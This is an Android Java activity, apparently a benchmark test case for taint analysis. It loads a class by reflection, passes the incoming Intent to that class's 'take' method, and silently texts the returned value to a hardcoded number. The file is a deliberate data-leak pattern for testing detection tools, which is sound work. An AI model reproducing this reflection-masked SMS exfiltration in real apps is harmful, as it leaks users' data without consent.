package com.example.sinkintentonly;

import java.lang.reflect.Method;

import android.os.Bundle;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.view.Menu;
import android.widget.TextView;

public class Activity2 extends Activity {

	String value = null, che, imei;
	String phoneNo;
	TextView tv;
	SmsManager sm;
	Class<?> c = null;
	Method method;
	Method method2;
	PendingIntent i1 = null;
	PendingIntent i2 = null;
	Object o;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_activity2);
		tv = (TextView) findViewById(R.id.textView1);
		phoneNo = "555-4";
		Intent im = getIntent();
		che = "com.example.sinkintentonly.send";
		try {

			c = Class.forName(che);
			Object[] obj = { im };
			o = c.newInstance();
			Class<?> params[] = new Class[obj.length];
			for (int i = 0; i < obj.length; i++) {
				if (obj[i] instanceof Intent) {
					params[i] = Intent.class;
				} else if (obj[i] instanceof Context) {
					params[i] = Context.class;
				}
			}
			method = o.getClass().getMethod("take", params);
			value = (String) method.invoke(o, obj);
			tv.setText(value);

		} catch (Exception e) {
			tv.setText("there is an error");
			e.printStackTrace();

		}

		sm = SmsManager.getDefault();
		sm.sendTextMessage(phoneNo, null, value, null, null);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.activity_activity2, menu);
		return true;
	}

}
